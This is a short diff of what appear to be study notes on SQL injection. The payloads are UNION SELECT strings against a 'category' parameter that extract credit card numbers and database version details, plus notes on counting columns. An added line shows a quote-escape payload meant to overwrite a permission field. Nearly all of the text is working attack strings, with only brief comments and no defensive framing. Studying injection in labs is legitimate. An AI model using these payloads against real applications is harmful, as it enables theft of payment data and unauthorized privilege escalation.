@@ -18,3 +18,6 @@ category=1 UNION SELECT 1,creditcard_number,3 FROM payments
 category=1 UNION SELECT @@version,database(),3 FROM information_schema.tables
 finding sql version, also recognize how many allowable columns,
 in this case only 3
+
+
+email\', 1)# how to escape the and replace the last field in permission
